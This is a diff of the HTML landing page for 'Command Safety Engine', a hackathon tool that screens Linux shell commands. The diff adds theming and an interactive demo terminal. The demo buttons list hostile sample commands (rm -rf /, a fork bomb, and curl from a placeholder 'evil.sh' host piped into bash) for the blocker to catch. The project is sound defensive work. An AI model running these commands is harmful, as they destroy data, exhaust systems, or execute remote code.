@@ -5,6 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Command Safety Engine — Offline AI Guard for the Linux Shell</title>
 <meta name="description" content="Command Safety Engine by Adhithya J — an offline AI guard for the Linux shell. Blocks dangerous commands before they run. C-DAC Secure OS Hackathon 2026." />
+<meta name="theme-color" content="#0b1020" />
+<meta property="og:title" content="Command Safety Engine" />
+<meta property="og:description" content="An offline AI guard for the Linux shell — by Adhithya J. C-DAC Secure OS Hackathon 2026." />
+<meta property="og:image" content="assets/tux.png" />
+<meta property="og:type" content="website" />
 <link rel="icon" type="image/png" href="assets/tux.png" />
 <style>
   :root {
@@ -20,13 +25,52 @@
     --violet: #a78bfa;
     --text: #e6ecff;
     --muted: #8b96c9;
+    --nav-bg: rgba(11,16,32,.78);
+    --term-bar: #0e1530;
+    --term-body: #080c1c;
+    --code-bg: #080c1c;
+    --pipe-bg: #0e1530;
+    --hero-logo-a: #1d2a52;
+    --hero-logo-b: #0d1428;
     --mono: "JetBrains Mono", "Fira Code", Consolas, monospace;
     --sans: "Inter", "Segoe UI", system-ui, sans-serif;
   }
 
+  html[data-theme="light"] {
+    --bg: #f4f6fe;
+    --bg2: #ffffff;
+    --card: #ffffff;
+    --line: #dbe3f7;
+    --green: #0f9d58;
+    --green-dim: #0b7a44;
+    --amber: #b07d09;
+    --red: #d9352f;
+    --cyan: #0e7490;
+    --violet: #6d4fc4;
+    --text: #111833;
+    --muted: #5a6590;
+    --nav-bg: rgba(255,255,255,.82);
+    --term-bar: #eef1fb;
+    --term-body: #ffffff;
+    --code-bg: #f4f7ff;
+    --pipe-bg: #eef1fb;
+    --hero-logo-a: #e9eefc;
+    --hero-logo-b: #ffffff;
+  }
+
+  html[data-theme="light"] .glow { opacity: .5; }
+  html[data-theme="light"] .matrix { display: none; }
+  html[data-theme="light"] .hero-logo { box-shadow: 0 0 0 8px rgba(15,157,88,.07), 0 30px 60px rgba(30,50,120,.18); }
+  html[data-theme="light"] .term-title,
+  html[data-theme="light"] .out { color: #5a6590; }
+  html[data-theme="light"] .codeblock .w { color: #223055; }
+  html[data-theme="light"] .codeblock .a { color: #8a5a00; }
+  html[data-theme="light"] .codeblock .c { color: #7c88b8; }
+
   * { margin: 0; padding: 0; box-sizing: border-box; }
 
   html { scroll-behavior: smooth; }
+  section[id], header[id] { scroll-margin-top: 78px; }
 
   body {
     background: var(--bg);
@@ -34,6 +78,7 @@
     font-family: var(--sans);
     line-height: 1.6;
     overflow-x: hidden;
+    transition: background .3s ease, color .3s ease;
   }
 
   /* ---------- animated background ---------- */
@@ -77,7 +122,8 @@
     top: 0;
     z-index: 50;
     backdrop-filter: blur(12px);
-    background: rgba(11,16,32,.75);
+    -webkit-backdrop-filter: blur(12px);
+    background: var(--nav-bg);
     border-bottom: 1px solid var(--line);
   }
 
@@ -87,15 +133,20 @@
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding: 14px 24px;
+    padding: 13px 24px;
+    gap: 10px;
   }
 
-  .brand { display: flex; align-items: center; gap: 10px; font-weight: 800; letter-spacing: .5px; }
-  .brand img { width: 34px; height: 34px; }
+  .brand { display: flex; align-items: center; gap: 10px; font-weight: 800; letter-spacing: .5px; text-decoration: none; color: var(--text); font-size: 15px; }
+  .brand img { width: 32px; height: 32px; flex-shrink: 0; }
+  .brand .hide-mobile { display: inline; }
+
+  .nav-right { display: flex; align-items: center; gap: 14px; }
 
   .nav-links { display: flex; gap: 22px; list-style: none; }
   .nav-links a { color: var(--muted); text-decoration: none; font-size: 14px; transition: color .2s; }
-  .nav-links a:hover { color: var(--green); }
+  .nav-links a:hover, .nav-links a.active { color: var(--green); }
+
   .nav-badge {
     background: linear-gradient(135deg, var(--green-dim), var(--green));
     color: #04130a;
@@ -105,26 +156,62 @@
     border-radius: 999px;
     text-decoration: none;
     letter-spacing: .5px;
+    white-space: nowrap;
   }
 
-  @media (max-width: 760px) {
-    .nav-links { display: none; }
+  .theme-btn, .hamburger {
+    background: transparent;
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    color: var(--text);
+    width: 40px; height: 40px;
+    font-size: 17px;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    transition: border-color .2s, transform .15s;
+  }
+  .theme-btn:hover, .hamburger:hover { border-color: var(--green); transform: translateY(-1px); }
+
+  .hamburger { display: none; flex-direction: column; gap: 4px; }
+  .hamburger span { width: 18px; height: 2px; background: var(--text); border-radius: 2px; transition: transform .25s, opacity .25s; }
+  .hamburger.open span:nth-child(1) { transform: translateY(6px) rotate(45deg); }
+  .hamburger.open span:nth-child(2) { opacity: 0; }
+  .hamburger.open span:nth-child(3) { transform: translateY(-6px) rotate(-45deg); }
+
+  @media (max-width: 860px) {
+    .hamburger { display: flex; }
+    .nav-links {
+      position: absolute;
+      top: 100%; left: 0; right: 0;
+      flex-direction: column;
+      gap: 0;
+      background: var(--nav-bg);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--line);
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height .3s ease;
+    }
+    .nav-links.open { max-height: 420px; }
+    .nav-links li { width: 100%; }
+    .nav-links a { display: block; padding: 14px 24px; border-top: 1px solid var(--line); font-size: 15px; }
   }
 
   /* ---------- hero ---------- */
   header.hero {
     max-width: 1100px;
     margin: 0 auto;
-    padding: 90px 24px 60px;
+    padding: 70px 20px 56px;
     text-align: center;
     position: relative;
   }
 
   .hero-logo {
-    width: 130px;
-    height: 130px;
+    width: 120px;
+    height: 120px;
     border-radius: 28px;
-    background: linear-gradient(160deg, #1d2a52, #0d1428);
+    background: linear-gradient(160deg, var(--hero-logo-a), var(--hero-logo-b));
     border: 1px solid var(--line);
     box-shadow: 0 0 0 8px rgba(61,220,132,.06), 0 30px 80px rgba(0,0,0,.5);
     padding: 18px;
@@ -142,17 +229,18 @@
     display: inline-block;
     margin-top: 26px;
     font-family: var(--mono);
-    font-size: 13px;
+    font-size: 12px;
     color: var(--green);
     border: 1px solid rgba(61,220,132,.4);
     background: rgba(61,220,132,.08);
-    padding: 6px 16px;
+    padding: 6px 14px;
     border-radius: 999px;
     letter-spacing: 1px;
+    max-width: 100%;
   }
 
   h1 {
-    font-size: clamp(38px, 6vw, 64px);
+    font-size: clamp(34px, 7vw, 62px);
     font-weight: 900;
     letter-spacing: -1px;
     margin: 18px 0 10px;
@@ -162,17 +250,23 @@
     color: transparent;
   }
 
+  html[data-theme="light"] h1 {
+    background: linear-gradient(120deg, #111833 30%, #0f9d58 60%, #0e7490);
+    -webkit-background-clip: text;
+    background-clip: text;
+  }
+
   .tagline {
-    font-size: clamp(17px, 2.4vw, 22px);
+    font-size: clamp(16px, 2.4vw, 21px);
     color: var(--muted);
     max-width: 640px;
     margin: 0 auto;
   }
 
   .hero-cta {
-    margin-top: 34px;
+    margin-top: 32px;
     display: flex;
-    gap: 16px;
+    gap: 14px;
     justify-content: center;
     flex-wrap: wrap;
   }
@@ -182,10 +276,12 @@
     font-family: var(--mono);
     font-size: 14px;
     font-weight: 700;
-    padding: 14px 28px;
+    padding: 13px 26px;
     border-radius: 12px;
     text-decoration: none;
     transition: transform .15s, box-shadow .15s;
+    border: none;
+    cursor: pointer;
   }
   .btn-primary {
     background: linear-gradient(135deg, var(--green-dim), var(--green));
@@ -201,10 +297,10 @@
   .btn-primary:hover { box-shadow: 0 18px 44px rgba(61,220,132,.45); }
 
   .hero-stats {
-    margin-top: 56px;
+    margin-top: 50px;
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-    gap: 14px;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 12px;
     max-width: 900px;
     margin-inline: auto;
   }
@@ -212,24 +308,25 @@
     background: var(--card);
     border: 1px solid var(--line);
     border-radius: 14px;
-    padding: 18px 12px;
+    padding: 16px 12px;
   }
-  .stat b { font-size: 26px; font-family: var(--mono); color: var(--green); display: block; }
-  .stat span { font-size: 13px; color: var(--muted); }
+  .stat b { font-size: 22px; font-family: var(--mono); color: var(--green); display: block; }
+  .stat span { font-size: 12.5px; color: var(--muted); }
 
-  /* ---------- terminal mock ---------- */
+  /* ---------- terminal ---------- */
   .terminal-wrap {
-    max-width: 860px;
-    margin: 60px auto 0;
+    max-width: 840px;
+    margin: 50px auto 0;
     text-align: left;
     border-radius: 16px;
     overflow: hidden;
     border: 1px solid var(--line);
     box-shadow: 0 40px 100px rgba(0,0,0,.55);
   }
+  html[data-theme="light"] .terminal-wrap { box-shadow: 0 30px 70px rgba(30,50,120,.18); }
   .term-bar {
-    background: #0e1530;
-    padding: 12px 16px;
+    background: var(--term-bar);
+    padding: 11px 16px;
     display: flex;
     align-items: center;
     gap: 8px;
@@ -237,12 +334,20 @@
   }
   .dot { width: 12px; height: 12px; border-radius: 50%; }
   .dot.r { background: #ff5f57; } .dot.y { background: #febc2e; } .dot.g { background: #28c840; }
-  .term-title { margin-left: 10px; font-family: var(--mono); font-size: 12px; color: var(--muted); }
-  .term-body { background: #080c1c; padding: 22px 24px; font-family: var(--mono); font-size: 14px; }
-  .term-body .line { margin-bottom: 8px; }
+  .term-title { margin-left: 10px; font-family: var(--mono); font-size: 12px; color: var(--muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .term-body {
+    background: var(--term-body);
+    padding: 20px 20px 10px;
+    font-family: var(--mono);
+    font-size: 13.5px;
+    max-height: 320px;
+    overflow-y: auto;
+    scroll-behavior: smooth;
+  }
+  .term-body .line { margin-bottom: 8px; word-wrap: break-word; }
   .term-body .cmd::before { content: "$ "; color: var(--green); font-weight: 700; }
   .term-body .in { color: var(--text); }
-  .term-body .out { color: var(--muted); padding-left: 8px; white-space: pre-wrap; }
+  .term-body .out { color: var(--muted); padding-left: 6px; white-space: pre-wrap; }
   .ok { color: var(--green); } .warn { color: var(--amber); } .block { color: var(--red); }
   .cursor {
     display: inline-block; width: 8px; height: 16px; background: var(--green);
@@ -250,11 +355,52 @@
   }
   @keyframes blink { 50% { opacity: 0; } }
 
+  .term-input-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: var(--term-body);
+    border-top: 1px solid var(--line);
+    padding: 10px 20px;
+  }
+  .term-input-row .prompt { font-family: var(--mono); color: var(--green); font-weight: 700; }
+  .term-input-row input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13.5px;
+    caret-color: var(--green);
+    min-width: 0;
+  }
+  .term-chips {
+    background: var(--term-body);
+    border-top: 1px solid var(--line);
+    padding: 8px 20px 12px;
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+  .term-chips button {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--cyan);
+    background: rgba(86,216,255,.08);
+    border: 1px solid var(--line);
+    border-radius: 999px;
+    padding: 5px 12px;
+    cursor: pointer;
+    transition: border-color .2s, transform .15s;
+  }
+  .term-chips button:hover { border-color: var(--green); transform: translateY(-1px); }
+
   /* ---------- sections ---------- */
   section {
     max-width: 1100px;
     margin: 0 auto;
-    padding: 80px 24px;
+    padding: 72px 20px;
   }
   .sec-tag {
     font-family: var(--mono);
@@ -264,18 +410,30 @@
     text-transform: uppercase;
   }
   h2 {
-    font-size: clamp(28px, 4vw, 40px);
+    font-size: clamp(26px, 4vw, 38px);
     font-weight: 800;
     margin: 10px 0 14px;
     letter-spacing: -.5px;
   }
   .sec-sub { color: var(--muted); max-width: 720px; }
+  .sec-sub code {
+    font-family: var(--mono); font-size: .85em; color: var(--cyan);
+    background: rgba(86,216,255,.08); padding: 1px 7px; border-radius: 6px;
+  }
+
+  /* reveal on scroll */
+  .reveal { opacity: 0; transform: translateY(26px); transition: opacity .65s ease, transform .65s ease; }
+  .reveal.in-view { opacity: 1; transform: none; }
+  @media (prefers-reduced-motion: reduce) {
+    .reveal { opacity: 1; transform: none; transition: none; }
+    html { scroll-behavior: auto; }
+  }
 
   /* verdicts */
-  .verdicts { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 18px; margin-top: 40px; }
+  .verdicts { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px; margin-top: 36px; }
   .verdict {
     border-radius: 16px;
-    padding: 26px;
+    padding: 24px;
     border: 1px solid var(--line);
     background: var(--card);
     transition: transform .2s, border-color .2s;
@@ -289,16 +447,16 @@
   .v-block { border-top: 3px solid var(--red); }
   .v-block .tag { background: rgba(255,92,87,.15); color: var(--red); }
   .verdict p { color: var(--muted); font-size: 14px; margin-top: 10px; }
-  .verdict .code { font-family: var(--mono); color: var(--text); font-size: 13px; margin-top: 12px; display: block; }
+  .verdict .code { font-family: var(--mono); color: var(--text); font-size: 13px; margin-top: 12px; display: block; word-break: break-all; }
 
   /* pipeline */
-  .pipeline { margin-top: 40px; display: flex; flex-direction: column; gap: 0; }
+  .pipeline { margin-top: 36px; display: flex; flex-direction: column; gap: 0; }
   .pipe-step {
     display: flex;
-    gap: 20px;
+    gap: 18px;
     align-items: flex-start;
     position: relative;
-    padding-bottom: 26px;
+    padding-bottom: 24px;
   }
   .pipe-step:not(:last-child)::before {
     content: "";
@@ -313,7 +471,7 @@
     border-radius: 12px;
     display: flex; align-items: center; justify-content: center;
     font-family: var(--mono); font-weight: 800;
-    background: #0e1530; border: 1px solid var(--line); color: var(--green);
+    background: var(--pipe-bg); border: 1px solid var(--line); color: var(--green);
   }
   .pipe-body h4 { font-size: 17px; }
   .pipe-body p { color: var(--muted); font-size: 14px; margin-top: 4px; }
@@ -323,50 +481,70 @@
   }
 
   /* cards grid */
-  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 18px; margin-top: 40px; }
+  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; margin-top: 36px; }
   .card {
     background: var(--card);
     border: 1px solid var(--line);
     border-radius: 16px;
-    padding: 26px;
+    padding: 24px;
     transition: transform .2s, border-color .2s;
   }
   .card:hover { transform: translateY(-6px); border-color: rgba(61,220,132,.5); }
   .card .ico { font-size: 26px; }
   .card h4 { margin: 12px 0 8px; font-size: 17px; }
   .card p { color: var(--muted); font-size: 14px; }
+  .card code {
+    font-family: var(--mono); font-size: 12px; color: var(--cyan);
+    background: rgba(86,216,255,.08); padding: 1px 6px; border-radius: 5px;
+  }
 
   /* numbers table */
-  .table-wrap { overflow-x: auto; margin-top: 36px; }
-  table { width: 100%; border-collapse: collapse; font-size: 14px; }
-  th, td { text-align: left; padding: 14px 18px; border-bottom: 1px solid var(--line); }
+  .table-wrap { overflow-x: auto; margin-top: 32px; -webkit-overflow-scrolling: touch; }
+  table { width: 100%; border-collapse: collapse; font-size: 14px; min-width: 420px; }
+  th, td { text-align: left; padding: 13px 16px; border-bottom: 1px solid var(--line); }
   th { font-family: var(--mono); color: var(--muted); font-size: 12px; letter-spacing: 1px; text-transform: uppercase; }
   td { font-family: var(--mono); }
   tr:hover td { background: rgba(255,255,255,.02); }
   .highlight td { color: var(--green); font-weight: 700; }
 
-  /* code block */
+  /* code block + copy */
+  .codeblock-wrap { position: relative; margin-top: 24px; }
   .codeblock {
-    background: #080c1c;
+    background: var(--code-bg);
     border: 1px solid var(--line);
     border-radius: 14px;
-    padding: 20px 24px;
+    padding: 20px 24px 20px;
     font-family: var(--mono);
-    font-size: 13.5px;
+    font-size: 13px;
     overflow-x: auto;
-    margin-top: 24px;
-    position: relative;
+    -webkit-overflow-scrolling: touch;
   }
   .codeblock .c { color: var(--muted); }
   .codeblock .g { color: var(--green); }
   .codeblock .a { color: var(--amber); }
-  .codeblock .w { color: #fff; }
+  .codeblock .w { color: var(--text); }
+  .codeblock .row { display: block; white-space: pre; }
+  .copy-btn {
+    position: absolute;
+    top: 12px; right: 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 5px 12px;
+    cursor: pointer;
+    transition: color .2s, border-color .2s;
+  }
+  .copy-btn:hover { color: var(--green); border-color: var(--green); }
 
   /* steps */
-  .steps { margin-top: 40px; counter-reset: step; display: grid; gap: 14px; }
+  .steps { margin-top: 36px; counter-reset: step; display: grid; gap: 14px; }
   .step {
-    display: flex; gap: 18px; align-items: flex-start;
-    background: var(--card); border: 1px solid var(--line); border-radius: 14px; padding: 20px;
+    display: flex; gap: 16px; align-items: flex-start;
+    background: var(--card); border: 1px solid var(--line); border-radius: 14px; padding: 18px;
+    min-width: 0;
   }
   .step::before {
     counter-increment: step;
@@ -377,17 +555,70 @@
     display: flex; align-items: center; justify-content: center; flex-shrink: 0;
   }
   .step h4 { font-size: 16px; }
-  .step p { color: var(--muted); font-size: 14px; }
+  .step p { color: var(--muted); font-size: 14px; overflow-wrap: break-word; }
   .step code {
     font-family: var(--mono); font-size: 12.5px; color: var(--cyan);
     background: rgba(86,216,255,.08); padding: 2px 8px; border-radius: 6px;
     word-break: break-all;
   }
+  .step .inline-btn {
+    font-family: var(--mono); font-size: 11px; color: var(--muted);
+    background: transparent; border: 1px solid var(--line); border-radius: 6px;
+    padding: 2px 8px; margin-left: 6px; cursor: pointer;
+  }
+  .step .inline-btn:hover { color: var(--green); border-color: var(--green); }
+
+  /* roadmap */
+  .roadmap-list { margin-top: 32px; display: grid; gap: 12px; }
+  .roadmap-item {
+    display: flex; gap: 14px; align-items: flex-start;
+    background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 16px 18px;
+  }
+  .roadmap-item .dot { flex-shrink: 0; margin-top: 5px; }
+  .roadmap-item b { font-size: 15px; }
+  .roadmap-item p { color: var(--muted); font-size: 13.5px; }
+
+  /* faq */
+  .faq-list { margin-top: 32px; display: grid; gap: 12px; }
+  .faq-item {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  .faq-q {
+    width: 100%;
+    background: transparent;
+    border: none;
+    text-align: left;
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 15.5px;
+    font-weight: 700;
+    padding: 18px 20px;
+    cursor: pointer;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 12px;
+  }
+  .faq-q .chev { color: var(--green); transition: transform .25s; font-family: var(--mono); }
+  .faq-item.open .faq-q .chev { transform: rotate(180deg); }
+  .faq-a {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height .3s ease;
+  }
+  .faq-a p { padding: 0 20px 18px; color: var(--muted); font-size: 14px; }
+  .faq-a code {
+    font-family: var(--mono); font-size: 12.5px; color: var(--cyan);
+    background: rgba(86,216,255,.08); padding: 1px 6px; border-radius: 5px;
+  }
 
   /* footer */
   footer {
     border-top: 1px solid var(--line);
-    padding: 46px 24px 60px;
+    padding: 44px 20px 56px;
     text-align: center;
     color: var(--muted);
     font-size: 14px;
@@ -408,8 +639,29 @@
   .kali-wrap img { filter: drop-shadow(0 8px 24px rgba(0,0,0,.5)); transition: transform .2s; }
   .kali-wrap:hover img { transform: scale(1.05); }
 
+  /* back to top */
+  .to-top {
+    position: fixed;
+    right: 18px; bottom: 18px;
+    z-index: 60;
+    width: 46px; height: 46px;
+    border-radius: 12px;
+    border: 1px solid var(--line);
+    background: var(--card);
+    color: var(--green);
+    font-size: 18px;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    opacity: 0;
+    transform: translateY(10px);
+    pointer-events: none;
+    transition: opacity .25s, transform .25s, border-color .2s;
+  }
+  .to-top.show { opacity: 1; transform: none; pointer-events: auto; }
+  .to-top:hover { border-color: var(--green); }
+
   ::selection { background: rgba(61,220,132,.3); }
-  ::-webkit-scrollbar { width: 10px; }
+  ::-webkit-scrollbar { width: 10px; height: 8px; }
   ::-webkit-scrollbar-track { background: var(--bg); }
   ::-webkit-scrollbar-thumb { background: var(--line); border-radius: 5px; }
 </style>
@@ -423,30 +675,35 @@
 <!-- ============ NAV ============ -->
 <nav>
   <div class="nav-inner">
-    <a class="brand" href="#top"><img src="assets/tux.png" alt="Linux" /> COMMAND SAFETY ENGINE</a>
-    <ul class="nav-links">
-      <li><a href="#verdicts">Verdicts</a></li>
-      <li><a href="#how">How it works</a></li>
-      <li><a href="#features">Features</a></li>
-      <li><a href="#numbers">Numbers</a></li>
-      <li><a href="#install">Install</a></li>
-    </ul>
-    <a class="nav-badge" href="https://github.com/Adhi-hub07/command-safety-engine" target="_blank">★ GitHub</a>
+    <a class="brand" href="#top"><img src="assets/tux.png" alt="Linux" /> <span class="hide-mobile">COMMAND SAFETY ENGINE</span></a>
+    <div class="nav-right">
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#verdicts">Verdicts</a></li>
+        <li><a href="#how">How it works</a></li>
+        <li><a href="#features">Features</a></li>
+        <li><a href="#numbers">Numbers</a></li>
+        <li><a href="#install">Install</a></li>
+        <li><a href="#faq">FAQ</a></li>
+      </ul>
+      <button id="themeBtn" class="theme-btn" aria-label="Toggle theme">🌙</button>
+      <button id="hamburger" class="hamburger" aria-label="Menu"><span></span><span></span><span></span></button>
+      <a class="nav-badge" href="https://github.com/Adhi-hub07/command-safety-engine" target="_blank">★ GitHub</a>
+    </div>
   </div>
 </nav>
 
 <!-- ============ HERO ============ -->
 <header class="hero" id="top">
-  <div class="hero-logo"><img src="assets/tux.png" alt="Linux logo" /></div>
+  <div class="hero-logo reveal"><img src="assets/tux.png" alt="Linux logo" /></div>
   <div class="chip">▮▮▮  C-DAC SECURE OS HACKATHON 2026 · TRACK 1  ▮▮▮</div>
-  <h1>COMMAND SAFETY ENGINE</h1>
-  <p class="tagline">An offline AI guard for the Linux shell. Every command is checked before it runs — dangerous ones are blocked, risky ones ask for confirmation, everything else passes in milliseconds.</p>
-  <div class="hero-cta">
+  <h1 class="reveal">COMMAND SAFETY ENGINE</h1>
+  <p class="tagline reveal">An offline AI guard for the Linux shell. Every command is checked before it runs — dangerous ones are blocked, risky ones ask for confirmation, everything else passes in milliseconds.</p>
+  <div class="hero-cta reveal">
     <a class="btn btn-primary" href="#install">⚡ Get Started</a>
     <a class="btn btn-ghost" href="#how">How it works ↓</a>
   </div>
 
-  <div class="hero-stats">
+  <div class="hero-stats reveal">
     <div class="stat"><b>0.34 ms</b><span>mean rule+ML check</span></div>
     <div class="stat"><b>1,379</b><span>labeled commands</span></div>
     <div class="stat"><b>3</b><span>layers of defence</span></div>
@@ -454,42 +711,50 @@
     <div class="stat"><b>20</b><span>MITRE-mapped rule groups</span></div>
   </div>
 
-  <!-- terminal mock -->
-  <div class="terminal-wrap">
+  <!-- interactive terminal -->
+  <div class="terminal-wrap reveal">
     <div class="term-bar">
       <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
-      <span class="term-title">adhithya@linux: ~/command-safety-engine</span>
+      <span class="term-title">adhithya@linux: ~/command-safety-engine — try it, it's live</span>
     </div>
-    <div class="term-body">
+    <div class="term-body" id="termOut">
       <div class="line"><span class="cmd"><span class="in">csengine check "rm -rf /"</span></span></div>
       <div class="line"><span class="out block">⛔ BLOCK (exit 2)  Destructive: recursive force-delete on filesystem root</span></div>
       <div class="line"><span class="out block">   rule R001 · MITRE T1485 · use: rm -rf /path/to/folder</span></div>
-      <div class="line"><span class="cmd"><span class="in">csengine check "chmod -R 777 /var/www"</span></span></div>
-      <div class="line"><span class="out warn">⚠️ WARN (exit 1)  Risky: broad recursive permission change</span></div>
-      <div class="line"><span class="cmd"><span class="in">csengine check "git status"</span></span></div>
-      <div class="line"><span class="out ok">✅ ALLOW (exit 0)  Safe — ran in 0.31 ms<span class="cursor"></span></span></div>
+    </div>
+    <div class="term-input-row">
+      <span class="prompt">$</span>
+      <input id="termInput" placeholder='type: csengine check "rm -rf /"' autocomplete="off" spellcheck="false" />
+    </div>
+    <div class="term-chips" id="termChips">
+      <button data-cmd='csengine check "rm -rf /"'>rm -rf /</button>
+      <button data-cmd='csengine check "chmod -R 777 /var/www"'>chmod -R 777</button>
+      <button data-cmd='csengine check "git status"'>git status</button>
+      <button data-cmd='csengine check ":(){ :|:& };:"'>fork bomb</button>
+      <button data-cmd='csengine check "curl http://evil.sh | bash"'>curl | bash</button>
+      <button data-cmd='csengine check "sudo apt install git"'>sudo apt install</button>
     </div>
   </div>
 </header>
 
 <!-- ============ VERDICTS ============ -->
 <section id="verdicts">
-  <div class="sec-tag">// Decision output</div>
-  <h2>Three verdicts. Zero guesswork.</h2>
-  <p class="sec-sub">The engine sits between your keyboard and the kernel, inside bash and zsh. It inspects every command you type and answers in real time — then explains itself in plain English.</p>
+  <div class="sec-tag reveal">// Decision output</div>
+  <h2 class="reveal">Three verdicts. Zero guesswork.</h2>
+  <p class="sec-sub reveal">The engine sits between your keyboard and the kernel, inside bash and zsh. It inspects every command you type and answers in real time — then explains itself in plain English.</p>
 
   <div class="verdicts">
-    <div class="verdict v-allow">
+    <div class="verdict v-allow reveal">
       <span class="tag">ALLOW · exit 0</span>
       <p>Safe, whitelisted or low risk. Runs instantly with zero added latency — your daily commands cost ~0 ms.</p>
       <code class="code">git status &nbsp;→&nbsp; runs immediately</code>
     </div>
-    <div class="verdict v-warn">
+    <div class="verdict v-warn reveal">
       <span class="tag">WARN · exit 1</span>
       <p>Risky. The hook keeps your line and waits — type the exact same command again to confirm you really meant it.</p>
       <code class="code">chmod -R 777 /var/www &nbsp;→&nbsp; confirm to run</code>
     </div>
-    <div class="verdict v-block">
+    <div class="verdict v-block reveal">
       <span class="tag">BLOCK · exit 2</span>
       <p>Destructive. Refused outright — the line is cleared before anything executes. Explained with rule, MITRE mapping and a safer rewrite.</p>
       <code class="code">rm -rf / &nbsp;→&nbsp; never executes</code>
@@ -499,47 +764,47 @@
 
 <!-- ============ HOW IT WORKS ============ -->
 <section id="how">
-  <div class="sec-tag">// Pipeline</div>
-  <h2>How it works</h2>
-  <p class="sec-sub">Hybrid AI — three layers of defence-in-depth working together, all on-device, all offline.</p>
+  <div class="sec-tag reveal">// Pipeline</div>
+  <h2 class="reveal">How it works</h2>
+  <p class="sec-sub reveal">Hybrid AI — three layers of defence-in-depth working together, all on-device, all offline.</p>
 
   <div class="pipeline">
-    <div class="pipe-step">
+    <div class="pipe-step reveal">
       <div class="pipe-num">1</div>
       <div class="pipe-body">
         <h4>Preprocess &amp; tokenize</h4>
         <p>Normalization, alias expansion, <code>$VAR</code> resolution, then a <code>bashlex</code> tokenizer parses words, pipes, redirects and substitutions.</p>
       </div>
     </div>
-    <div class="pipe-step">
+    <div class="pipe-step reveal">
       <div class="pipe-num">2</div>
       <div class="pipe-body">
         <h4>Rule engine — deterministic</h4>
         <p>20 MITRE-mapped rule groups (<code>R001–R020</code>) match instantly and can never be argued out of a block.</p>
       </div>
     </div>
-    <div class="pipe-step">
+    <div class="pipe-step reveal">
       <div class="pipe-num">3</div>
       <div class="pipe-body">
         <h4>ML classifier</h4>
         <p>scikit-learn <b>GradientBoosting</b> trained on 1,379 real + synthetic commands classifies safe / risky / destructive across 20 features.</p>
       </div>
     </div>
-    <div class="pipe-step">
+    <div class="pipe-step reveal">
       <div class="pipe-num">4</div>
       <div class="pipe-body">
         <h4>Local LLM — Qwen 2.5 3B</h4>
         <p>Invoked <i>only</i> for ambiguous or novel commands to write a plain-English explanation and a safer alternative. Runs on Ollama, fully offline.</p>
       </div>
     </div>
-    <div class="pipe-step">
+    <div class="pipe-step reveal">
       <div class="pipe-num">5</div>
       <div class="pipe-body">
         <h4>Decision fusion</h4>
         <p>Rules and ML are fused into a <code>0–100</code> risk score. A critical rule always blocks regardless of ML confidence — the model can never talk the system out of a block.</p>
       </div>
     </div>
-    <div class="pipe-step">
+    <div class="pipe-step reveal">
       <div class="pipe-num">6</div>
       <div class="pipe-body">
         <h4>Output + audit</h4>
@@ -551,30 +816,30 @@
 
 <!-- ============ FEATURES ============ -->
 <section id="features">
-  <div class="sec-tag">// Why it exists</div>
-  <h2>A terminal is the most powerful — and least protected — interface on Linux</h2>
-  <p class="sec-sub">One mistyped or copy-pasted command (<code>rm -rf /</code>, a fork bomb, a <code>curl | bash</code> chain) can destroy data or hand an attacker the machine. No mainstream OS ships a safety layer between the keyboard and the kernel — until now.</p>
+  <div class="sec-tag reveal">// Why it exists</div>
+  <h2 class="reveal">A terminal is the most powerful — and least protected — interface on Linux</h2>
+  <p class="sec-sub reveal">One mistyped or copy-pasted command (<code>rm -rf /</code>, a fork bomb, a <code>curl | bash</code> chain) can destroy data or hand an attacker the machine. No mainstream OS ships a safety layer between the keyboard and the kernel — until now.</p>
 
   <div class="grid">
-    <div class="card"><div class="ico">🔌</div><h4>100% offline</h4><p>No cloud APIs, no telemetry, no data egress. Aligned with India's sovereign OS (AtmaNirbhar) mission — fully functional on air-gapped government networks.</p></div>
-    <div class="card"><div class="ico">🧠</div><h4>Hybrid AI</h4><p>Deterministic rules + trained ML classifier + local LLM. Three independent layers that cross-check each other in milliseconds.</p></div>
-    <div class="card"><div class="ico">⚡</div><h4>Fast</h4><p>Rules + ML path ≈ 0.34 ms mean (p95 0.61 ms). Full pipeline ≈ 3 ms. Whitelisted daily commands cost ~0 ms.</p></div>
-    <div class="card"><div class="ico">🛡️</div><h4>Safety-first override</h4><p>A single critical rule match blocks regardless of ML confidence. The model can never talk the system out of a block.</p></div>
-    <div class="card"><div class="ico">📖</div><h4>Explains &amp; teaches</h4><p>Every warning shows the matched rule, its MITRE mapping, why it matters, and a safer rewrite like <code>rm -rf /path/to/folder</code>.</p></div>
-    <div class="card"><div class="ico">🔐</div><h4>Privacy-preserving audit</h4><p><code>~/.csengine/audit.log</code> stores only truncated SHA-256 hashes — incidents are correlatable, but commands can never be recovered.</p></div>
